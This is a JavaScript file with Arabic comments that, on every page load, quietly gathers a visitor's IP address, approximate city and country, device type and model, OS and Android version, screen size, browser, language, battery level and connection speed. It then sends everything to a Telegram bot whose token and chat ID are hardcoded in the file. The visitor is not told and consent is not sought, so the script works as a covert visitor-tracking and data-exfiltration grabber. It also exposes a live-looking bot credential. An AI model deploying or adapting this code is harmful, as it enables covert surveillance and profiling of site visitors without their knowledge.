
// دالة لجلب عنوان IP
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('❌ خطأ في جلب عنوان IP:', error);
        return null;
    }
}

// دالة للحصول على الموقع الجغرافي بناءً على IP
async function getLocation(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city}, ${data.country_name}`;
    } catch (error) {
        console.error('❌ خطأ في جلب الموقع:', error);
        return 'غير معروف';
    }
}

// دالة لتحديد نوع الجهاز، نظام التشغيل، الطراز، وإصدار Android
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = 'غير معروف';
    let os = 'غير معروف';
    let deviceModel = 'غير متوفر';
    let androidVersion = 'غير متوفر';

    // تحديد نوع الجهاز
    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = 'هاتف محمول';
    } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = 'جهاز لوحي';
    } else {
        deviceType = ' كمبيوتر';
    }

    // تحديد نظام التشغيل
    if (/Android/i.test(userAgent)) {
        os = 'Android';
        const androidMatch = userAgent.match(/Android\s([0-9.]+)/);
        if (androidMatch) {
            androidVersion = androidMatch[1];
        }
        const modelMatch = userAgent.match(/; (\S+ Build)/);
        if (modelMatch) {
            deviceModel = modelMatch[1].replace(' Build', '');
        }
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        os = 'iOS';
        deviceModel = /iPhone/.test(userAgent) ? 'iPhone' : 'iPad';
    } else if (/Windows/i.test(userAgent)) {
        os = ' Windows';
    } else if (/Mac/i.test(userAgent)) {
        os = ' macOS';
    } else if (/Linux/i.test(userAgent)) {
        os = ' Linux';
    }

    return { deviceType, os, deviceModel, androidVersion };
}

// دالة لجلب بيانات إضافية عن الزائر
async function getExtraInfo() {
    const screenWidth = screen.width;
    const screenHeight = screen.height;
    const language = navigator.language || 'غير معروف';
    const browser = navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)/) || ['غير معروف'];
    
    let batteryLevel = 'غير متوفر';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
        } catch (error) {
            console.error('⚡ خطأ في جلب مستوى البطارية:', error);
        }
    }

    let connectionSpeed = 'غير متوفر';
    if (navigator.connection) {
        const speed = navigator.connection.downlink;
        connectionSpeed = `${speed} Mbps`;
    }

    return { screenWidth, screenHeight, language, browser: browser[0], batteryLevel, connectionSpeed };
}

// دالة لإرسال البيانات إلى Telegram
async function sendToBot(message) {
    const botToken = '7514072650:AAFGKtQP-8eITRR9ccZcjs65KzTyqHzKwu0'; 
    const chatId = '5962064921';  

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('✅ تم إرسال البيانات إلى البوت بنجاح!');
        } else {
            console.error('❌ فشل إرسال البيانات:', data);
        }
    } catch (error) {
        console.error('🚨 حدث خطأ أثناء الإرسال:', error);
    }
}

// الكود الرئيسي
window.onload = async function() {
    const startTime = new Date();

    // جمع المعلومات الأساسية
    const ipAddress = await getIPAddress();
    const location = ipAddress ? await getLocation(ipAddress) : 'غير معروف';
    const { deviceType, os, deviceModel, androidVersion } = getDeviceInfo();
    const { screenWidth, screenHeight, language, browser, batteryLevel, connectionSpeed } = await getExtraInfo();
    const siteURL = window.location.href;

    // فصل التاريخ والوقت
    const entryDate = startTime.toLocaleDateString();
    const entryTime = startTime.toLocaleTimeString();

    // تنسيق الرسالة
    const entryMessage = `
🍃 <b>تم تسجيل دخول جديد إلى الموقع!</b>


🌍 <b>معلومات الدخول:</b>  
🆔 <b>عنوان :</b> <code>${ipAddress || 'غير معروف'}</code> 
📍 <b>الموقع الجغرافي:</b> <code>${location}</code>  
🔗 <b>رابط الموقع:</b> <a href="${siteURL}">${siteURL}</a>  

📱 <b>معلومات الجهاز:</b>  
💻 <b>نوع الجهاز:</b> <code>${deviceType}</code>  
🖥 <b>نظام التشغيل:</b> <code>${os}</code>  
📟 <b>طراز الجهاز:</b> <code>${deviceModel}</code>  
📲 <b>إصدار Android:</b> <code>${androidVersion}</code>

🛠 <b>معلومات إضافية:</b>  
🌐 <b>المتصفح:</b> <code>${browser}</code>  
🖥 <b>دقة الشاشة:</b> <code>${screenWidth} × ${screenHeight}</code>  
🗣 <b>لغة المتصفح:</b> <code>${language}</code>  
⚡ <b>سرعة الإنترنت:</b> <code>${connectionSpeed}</code>
🔋 <b>نسبة الشحن:</b> <code>${batteryLevel}</code>  

⏳ <b>التوقيت:</b>  
📅 <b>التاريخ:</b> <code>${entryDate}</code>  
⏰ <b>الوقت:</b> <code>${entryTime}</code>  
—————————————————————————
`;

    await sendToBot(entryMessage);
};
